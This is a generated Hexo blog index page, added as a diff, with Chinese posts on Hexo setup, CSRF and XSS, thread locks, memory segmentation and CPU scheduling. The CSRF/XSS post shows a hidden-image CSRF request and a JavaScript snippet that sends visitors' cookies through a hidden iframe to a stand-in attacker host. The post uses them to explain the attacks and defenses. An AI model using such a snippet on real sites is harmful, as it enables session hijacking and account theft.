@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/07/hello-world/" class="article-date">
+  <time datetime="2020-03-07T05:03:06.688Z" itemprop="datePublished">2020-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/07/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/07/hello-world/" data-id="ck7h5rr6b00000i3xbgoy6qdm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CSRF-和-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/27/CSRF-%E5%92%8C-XSS/" class="article-date">
+  <time datetime="2019-10-26T16:00:00.000Z" itemprop="datePublished">2019-10-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/27/CSRF-%E5%92%8C-XSS/">CSRF 和 XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。</p>
+<p>说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？</p>
+<p>不过，我还是想做个简短的笔记，来回忆这几天的想法。</p>
+<h2 id="什麽是-CSRF"><a href="#什麽是-CSRF" class="headerlink" title="什麽是 CSRF"></a>什麽是 CSRF</h2><p>Crossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。</p>
+<p>在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。</p>
+<p>大坏蛋就利用这两个机制，发起了 CSRF。</p>
+<p>举个简单的例子。小明在 A 网站（<a href="http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了" target="_blank" rel="noopener">http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了</a> Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;A&#x2F;delete?id&#x3D;3&#39; width&#x3D;&#39;0&#39; height&#x3D;&#39;0&#39; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。</p>
+<p>如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 <a href="https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有" target="_blank" rel="noopener">https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有</a> cookies，没有登录，拒决了访问。</p>
+<p>但对小明而言，这就是大问题了。小明的浏览器会访问 <a href="https://A/delete?id=3，然后将" target="_blank" rel="noopener">https://A/delete?id=3，然后将</a> A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。</p>
+<p>于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。</p>
+<p>CSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。</p>
+<h2 id="什麽是XSS"><a href="#什麽是XSS" class="headerlink" title="什麽是XSS"></a>什麽是XSS</h2><p>和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。</p>
+<p>但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。</p>
+<p>还是个简单的例子。</p>
+<p>小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。</p>
+<p>然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 用 &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt; 包起来放在文章中</span><br><span class="line">(function(window, document) &#123;</span><br><span class="line">    var cookies &#x3D; document.cookie;</span><br><span class="line">    var xssURIBase &#x3D; &quot;http:&#x2F;&#x2F;小坏蛋的IP&#x2F;myxss&#x2F;&quot;;</span><br><span class="line">    var xssURI &#x3D; xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    &#x2F;&#x2F; 建立隐藏 iframe 用于通讯</span><br><span class="line">    var hideFrame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height &#x3D; 0;</span><br><span class="line">    hideFrame.width &#x3D; 0;</span><br><span class="line">    hideFrame.style.display &#x3D; &quot;none&quot;;</span><br><span class="line">    hideFrame.src &#x3D; xssURI;</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br></pre></td></tr></table></figure>
+
+<p>明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。</p>
+<p>与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。</p>
+<hr>
+<p>所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。</p>
+<p>因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。</p>
+<p>道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/27/CSRF-%E5%92%8C-XSS/" data-id="ck7h91ty30009633xaeok9jaa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-线程锁（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2019-10-12T16:00:00.000Z" itemprop="datePublished">2019-10-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/">线程锁（一）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>以前在阅读有关于 Python 性能的文章时，总是有人提到「僞线程」和「线程锁」这两个词。由于基础不够，当有人提到 Python 性能时，我也只能学着他们，说「Python 是僞线程啦！不行啦！」之类的话。但是，印在我股子里的装B劲，还是渴望有一天能理解，究竟何爲「锁」？爲何需要「锁」？如何「锁」？以及「GIL的问题」。</p>
+<h2 id="何爲锁？"><a href="#何爲锁？" class="headerlink" title="何爲锁？"></a>何爲锁？</h2><p><img src="1570974760163.png" alt=""></p>
+<p>如上面这张图所展示的，在运行多线程 Python 程序时，CPU 内只允许一个线程运行，开始运行其中一个线程时，一定要将「锁」住，不让其它线程运行。当要运行其它线程时，会打开锁，然后再执行第二个线程。如此一来，同一个 CPU 里，只允许一个线程运行。</p>
+<h2 id="爲何需要锁？"><a href="#爲何需要锁？" class="headerlink" title="爲何需要锁？"></a>爲何需要锁？</h2><p>当然，你也许会想：正常情况下，单核 CPU 也是一次运行一个线程，然后系统中断去执行其它线程，锁的意义何在啊？</p>
+<p>的确，系统中断是现代系统的基础，但也因爲它的存在，不得不使用锁。</p>
+<p>举个简单明了的例子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1 #include &lt;stdio.h&gt;</span><br><span class="line">2 #include &lt;pthread.h&gt;</span><br><span class="line">3 #include &quot;mythreads.h&quot;</span><br><span class="line">4</span><br><span class="line">5 static volatile int counter &#x3D; 0;</span><br><span class="line">6</span><br><span class="line">7 &#x2F;&#x2F;</span><br><span class="line">8 &#x2F;&#x2F; mythread()</span><br><span class="line">9 &#x2F;&#x2F;</span><br><span class="line">10 &#x2F;&#x2F; 用循环将1加到1e7</span><br><span class="line">11 &#x2F;&#x2F; 这不是展示如何使用线程</span><br><span class="line">12 &#x2F;&#x2F; 而是表达线程的问题</span><br><span class="line">13 &#x2F;&#x2F;</span><br><span class="line">14 void *</span><br><span class="line">15 mythread(void * arg)</span><br><span class="line">16 &#123;</span><br><span class="line">17 printf(&quot;%s: begin\n&quot;, (char * ) arg);</span><br><span class="line">18 int i;</span><br><span class="line">19 for (i &#x3D; 0; i &lt; 1e7; i++) &#123;</span><br><span class="line">20 counter &#x3D; counter + 1;</span><br><span class="line">21 &#125;</span><br><span class="line">22 printf(&quot;%s: done\n&quot;, (char * ) arg);</span><br><span class="line">23 return NULL;</span><br><span class="line">24 &#125;</span><br><span class="line">25</span><br><span class="line">26 &#x2F;&#x2F;</span><br><span class="line">27 &#x2F;&#x2F; main()</span><br><span class="line">28 &#x2F;&#x2F;</span><br><span class="line">29 &#x2F;&#x2F; 运行两个线程</span><br><span class="line">30 &#x2F;&#x2F; 然后等待它们完成（Pthread_join）</span><br><span class="line">31 &#x2F;&#x2F;</span><br><span class="line">32 int</span><br><span class="line">33 main(int argc, char * argv[])</span><br><span class="line">34 &#123;</span><br><span class="line">35 pthread_t p1, p2;</span><br><span class="line">36 printf(&quot;main: begin (counter &#x3D; %d)\n&quot;, counter);</span><br><span class="line">37 Pthread_create(&amp;p1, NULL, mythread, &quot;A&quot;);</span><br><span class="line">38 Pthread_create(&amp;p2, NULL, mythread, &quot;B&quot;);</span><br><span class="line">39</span><br><span class="line">40 &#x2F;&#x2F; join waits for the threads to finish</span><br><span class="line">41 Pthread_join(p1, NULL);</span><br><span class="line">42 Pthread_join(p2, NULL);</span><br><span class="line">43 printf(&quot;main: done with both (counter &#x3D; %d)\n&quot;, counter);</span><br><span class="line">44 return 0;</span><br><span class="line">45 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的这段代码，使用了两个线程操作一个全局变量 counter，每个线程都将它加到 1e7。可以预见，它最后的结果将是 2e7。可是，实际运行下来，并非如此。</p>
+<p><img src="1570974768741.png" alt=""></p>
+<p><img src="1570974768743.png" alt=""></p>
+<p><img src="1570974769063.png" alt=""></p>
+<p>三次运行下来，结果完全不同。</p>
+<p>这违反了我们的直觉。明明同一段代码，操作同一个变量，爲什麽出来了完全不同的答案？</p>
+<p>原因不难解释，我们先来看看 X86 架构下 加法 操作对应的汇编代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov 0xabcde, %eax</span><br><span class="line">add 0x1, %eax</span><br><span class="line">mov %eax, 0xabcde</span><br></pre></td></tr></table></figure>
+
+<p>在计算机中，加法操作分成三部分。</p>
+<ol>
+<li>将被加数放进 寄存器</li>
+<li>对 寄存器 进行加法</li>
+<li>将 寄存器 里的数字放到原先被加数的地址</li>
+</ol>
+<p>问题也就出在这三部操作这里。抢佔调度发生时，它可不管你在做什麽。很可能就会发生下面的情景。</p>
+<ul>
+<li><p>counter = 6</p>
+</li>
+<li><p>add 0x1, %eax (此时 %eax 变成了 7，但并没有存到 counter )</p>
+</li>
+<li><p>CPU 被抢佔</p>
+</li>
+<li><p>第二个线程做完加法，counter = 7</p>
+</li>
+<li><p>恢復到第一个线程，将 %eax 的 7 存到 counter</p>
+</li>
+<li><p>counter = 7</p>
+</li>
+</ul>
+<p>注意，我们 的 counter 两次加 1，却只从 6 变到 7！</p>
+<p>正是由于系统中断，使得本应一次完成的事情，分成了两次完成，造成了数据的两次计算。这也是问题的最大根原。</p>
+<p>爲此，我们必须考虑：在进行某些操作时，避免因中断（切换上下文 ）导致原子性问题。<br>如何锁</p>
+<p>由于原子性问题是因中断导致的，在不引入新的指令前，最先想到的办法就是：在执行一些重要操作时，干掉中断！比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int faker()&#123;</span><br><span class="line">    lock();</span><br><span class="line">    a &#x3D; a + 1;</span><br><span class="line">    unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行 lock 之后，干掉中断，执行完后面的代码之后，再 unlock，打开中断。大略一看，是不错的想法。但别忘了我们最初设计中断的原因。是要避免下面这种情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int loop_function()&#123;</span><br><span class="line">    lock();</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        do_something();</span><br><span class="line">    &#125;</span><br><span class="line">    unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然，一旦某个大坏蛋（或者二伍仔）写了上面的代码，除了关机，没任何办法可以夺回 CPU 了。更何况，关掉中断只能关掉当前的处理器，其它的处理器依然会中断，然后搞坏计算结果。关掉中断真是个糟透的想法。</p>
+<p>那换个想法，但无限循环这个办法可以用在我们接下来的设计上。(爲了方便，我使用 python 改写教材里的示例，这段代码在 python 中没有多少意义)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class lock_t():</span><br><span class="line">    def init(self):</span><br><span class="line">        self.flag &#x3D; 0</span><br><span class="line"></span><br><span class="line">def init(mutex):</span><br><span class="line">    mutex.flag &#x3D; 0</span><br><span class="line">    </span><br><span class="line">def lock(mutex):</span><br><span class="line">    while (mutex.flag &#x3D;&#x3D; 1):</span><br><span class="line">        continue</span><br><span class="line">    mutex.flag &#x3D; 1</span><br><span class="line">    </span><br><span class="line">def unlock(mutex):</span><br><span class="line">    mutex.flag &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码是定义锁的「锁」、「开锁」功能。现在假设线程 A 在运行，它准备做一个原子操作，同时 mutex 对象是全局对象。那麽，代码可能是这样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def do():</span><br><span class="line">    lock(mutex) # A 线程执行到这里</span><br><span class="line">    a &#x3D; a+1</span><br><span class="line">    unlock(mutex)</span><br></pre></td></tr></table></figure>
+
+<p>此时，线程 B 夺得了 CPU 的使用权。它也会执行 lock(mutex)。但它运行到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while (mutex.flag &#x3D;&#x3D; 1)</span><br></pre></td></tr></table></figure>
+
+<p>时，因爲 A 已经先执行了，所以 mute.flag 已经是 1 了。在 B 运行期间，因爲 mutex.flag 是 1 的原故，它被困在了 while loop 里。</p>
+<p>然后等到 A 夺回 CPU 使用权。A 做完 a = a+1，然后 unlock(mutex)，mutex.flag 变回了 0。此时，假设 B 又夺到了 CPU 使用权。mutex.flag 已经是 0 了，从 while loop 里跳出。。。</p>
+<p>就这样，一个简单的锁就完成了。</p>
+<p>但，真的一点问题也没有吗？</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ck7h80pzh0008633x5t276ads" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-段式存储" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/09/23/%E6%AE%B5%E5%BC%8F%E5%AD%98%E5%82%A8/" class="article-date">
+  <time datetime="2019-09-22T16:00:00.000Z" itemprop="datePublished">2019-09-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/23/%E6%AE%B5%E5%BC%8F%E5%AD%98%E5%82%A8/">段式存储</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>之前提及过页式存储。今天想来聊一聊段式存储。</p>
+<p>在概念上，段式存储比段页式简单得多。后面的所有东西都建立在 base-bound 对上。换而言之，每一段都有一个 base (基底) 和 bound(上限)。</p>
+<p>于是，我们将每一个程序分成三个段。code、heap、stack，分别对应着每一个程序需要的三部分：指令、堆、栈。当我们获得一个虚拟地址时，我们怎麽知道它对应着这三部分的哪一块？最简单的办法就是将地址的前两位用作辨识位，比如：01 代表 code，10 代表heap，11 代表 stack。</p>
+<p>code 区，顾名思义，就是存放代码，存放指令的区域。heap 段用于存放 malloc 分配出来的数据。stack 比较特殊，它是从高地址往低地址长。</p>
+<p>stack 这块区域用来存放变量，同时，它还负责函数调用。当发生函数调用时，要将参数，以及调用函数的地址都要存进栈里，同时，还要将寄存器里清空，装上调用函数的值。当函数执行完时，通过调用函数的地址，回到上一个函数里，同时，还要復原寄存器。</p>
+<p>所以有时候我们不建义过份的调用函数，因爲调用函数时，面临着切换上下文等複杂的操作。这些工作实在是太浪费资源了。</p>
+<p>当然，除此以外还有 BBS 段，data 段，不过重点不在这里。</p>
+<blockquote>
+<h2 id="与之而来的"><a href="#与之而来的" class="headerlink" title="与之而来的"></a>与之而来的</h2></blockquote>
+<p>在好处这点上，和分页式很像：简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）。</p>
+<p>同时，分段之后，也便于多个进程共享代码、数据。</p>
+<p>但是，因爲段是有 base-bound 的界线。这就会出来一个问题：太小的空间无法分给段。比如一个 700 kb 的空间，每段要 300 kb，那麽就会有 100 Kb 的空间无法使用。在多次 malloc 和 free 之后，内存空间里，就会有许许多多的碎片。</p>
+<p>举个简单的例子：</p>
+<p><img src="1569248244054.png" alt=""></p>
+<p>之前给程序分配了三部分，0-10, 10-20, 20-30。在使用一段时间之后，第一段和第三段被 free。就留下了中间 10-20 的段。</p>
+<p>在这种情况下，我想要 15 大小的空间就完全不可能了。因爲第一段，第三段都只有 10。明明剩下的空间有 20，却连 15 都分不出来。</p>
+<p>这就是碎片。</p>
+<blockquote>
+<h2 id="解决碎片"><a href="#解决碎片" class="headerlink" title="解决碎片"></a>解决碎片</h2></blockquote>
+<p>虽然存在碎片的问题，但并非不可以解决。</p>
+<p>一是通过回收聚合，二是在分配时，做点小工作，比如下面的几种办法。</p>
+<p>最简单的解决途径：best fit、worst fit。每次选空间时，总是选最大或最小的片段，基本解决了大量的碎片问题。但选最大或最小都不得不进行一次遍历，这就是 O(n) 的问题了。</p>
+<p>也有比较巧的办法，比如 Segregated LIsts。通过再建一条常用对象 list，将常用大小的空间留出来，如果大小符合，就先使用，否则就使用另一条任意大小的空间。</p>
+<p>另一种办法是 Buddy Allocation。核心思想就是递归分集。</p>
+<p><img src="1569248251853.png" alt=""></p>
+<p>这样子，一旦分到不能装下需要的空间时，那麽就是最合适的段了。虽然有可能出现内部碎片（比如，在这里只要了 6 KB，剩下 2 KB就浪费了），但回收时，非常便利。只要看相领的段有没有被使用，使用了就暂时不回收，否则回收聚合，相当轻快。</p>
+<p>补充完段式，关于虚拟地址的内容差不多就结束了。下次将重点转到併发上。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/09/23/%E6%AE%B5%E5%BC%8F%E5%AD%98%E5%82%A8/" data-id="ck7h7wnck0007633x1jqddsen" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-调度算法（二）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/09/08/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
+  <time datetime="2019-09-07T16:00:00.000Z" itemprop="datePublished">2019-09-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/08/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/">调度算法（二）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>说完 SJF 算法，我们再来看看一个新的问题。</p>
+<p>如果，所有的任务并不是同时进入队列怎麽办？</p>
+<p>SJF 算法之所以成立，很重要的一点是：我们知道队列里所有 job，并且比较了它们。假如，哪怕是 1s，两个任务先后进入了队列，我们的 CPU 可能就无法比较它们，然后找出最短的 job，SJF 算法也就崩分离析，变回了 FIFO。</p>
+<p>爲了解决这个问题，我们在 SJF 的高度上，再做一点修改。</p>
+<h2 id="最先能完成的先来-STCF-Short-Time-to-Completion-First"><a href="#最先能完成的先来-STCF-Short-Time-to-Completion-First" class="headerlink" title="最先能完成的先来 STCF (Short Time-to-Completion First)"></a>最先能完成的先来 STCF (Short Time-to-Completion First)</h2><p>前面的两个算法，无论是 FIFO 还是 SJF 都是按顺序执行的，也就是说，队列前面的 job 没完成，是不能执行后面的 job。</p>
+<p>这点有点违背现实。我们煮水时，是不会等水煮完再去洗杯子，而应该是等水开的时间里去洗。虽然这个例子并不适用于我们要说的这个算法，但理念是相同的：我们可以中断任务，然后执行其它任务。</p>
+<p>现在任务 A 是 100s 完成，B 是 10s 完成。还是最开始的问题：如果两个 job 先后进入队列里，应该怎麽办？</p>
+<p>在 SJF 里，如果 B 先进那还好，A 先进入的话，就出问题了。因爲 A 进入时，队列里还没有任何 job，那麽 CPU 理所当然的认爲 A 是最短的任务，然后执行它。这时候再进入 B，已经是执行 A 之后的事了，B 只能乖乖等 A 执行完。那麽 Turnaroud Time 平均时间和 FIFO 是完全一样的。</p>
+<p>$ 100+1102=105s\cfrac{100+110}{2} = 105 s 2100+110​=105s $</p>
+<p>换成 STCF，如果 A 先后进入队列里，B 在进入，会发生什麽？首先，在 B 进来之前，A 是最短可完成的 job。在执行 1s 之后，队列 B 进来了。队列一看，发现 B 才是最短可完成的 job。于是 CPU 会中断，(关于 job 之前的切换，以后再提)然后换成执行 B，等 B 完成之后，再执行 A。</p>
+<p>$ 10+10+1002=60s\cfrac{10+10+100}{2} = 60 s 210+10+100​=60s $</p>
+<p>减少近一半的时间。所以，这麽优化是值得的。这几乎是我们能想到，最优的算法了吧？</p>
